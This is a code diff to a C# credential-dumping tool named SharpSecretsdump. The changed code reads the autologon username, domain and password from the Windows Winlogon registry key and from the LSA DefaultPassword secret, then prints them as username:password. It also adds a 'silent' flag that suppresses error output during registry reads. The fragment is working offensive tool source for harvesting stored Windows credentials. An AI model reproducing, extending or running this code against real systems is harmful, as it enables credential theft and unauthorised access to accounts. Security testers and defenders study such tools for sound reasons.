@@ -247,9 +247,9 @@ namespace SharpSecretsdump
                                     }
                                     else if (secret.ToUpper().StartsWith("DEFAULTPASSWORD"))
                                     {
-                                        byte[] usernameArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName");
-                                        byte[] domainArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName");
-                                        byte[] passwordArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword");
+                                        byte[] usernameArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName", true);
+                                        byte[] domainArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName", true);
+                                        byte[] passwordArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword", true);
                                         string username;
                                         if (usernameArr != null)
                                         {
@@ -266,11 +266,11 @@ namespace SharpSecretsdump
                                             domain = domain.Remove(domain.Length - 1);
                                             username = $"{domain}\\{username}";
                                         }
-                                        Console.WriteLine($"{secret}: {username}:{Encoding.Unicode.GetString(secretBlob.secret)}");
+                                        Console.WriteLine($"{username}:{Encoding.Unicode.GetString(secretBlob.secret)}");
                                         // For some reason password can be also defined in Winlogon
                                         if (passwordArr != null)
                                         {
-                                            Console.WriteLine($"{secret}: {username}:{Encoding.ASCII.GetString(passwordArr)}");
+                                            Console.WriteLine($"{username}:{Encoding.ASCII.GetString(passwordArr)}");
                                         }
                                     }
                                     else
@@ -466,7 +466,7 @@ namespace SharpSecretsdump
             }
         }
 
-        public static byte[] GetRegKeyValue(string keyPath, string valueName = null)
+        public static byte[] GetRegKeyValue(string keyPath, string valueName = null, bool silent = false)
         {
             IntPtr hKey = IntPtr.Zero;
 
@@ -487,7 +487,10 @@ namespace SharpSecretsdump
             if (result != 0)
             {
                 string errorMessage = new Win32Exception((int)result).Message;
-                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
+                if (!silent)
+                {
+                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
+                }
                 return null;
             }
 
@@ -496,7 +499,10 @@ namespace SharpSecretsdump
             if (result != 0)
             {
                 string errorMessage = new Win32Exception((int)result).Message;
-                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
+                if (!silent)
+                {
+                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, result, errorMessage);
+                }
                 return null;
             }
             byte[] data = new byte[cbData];
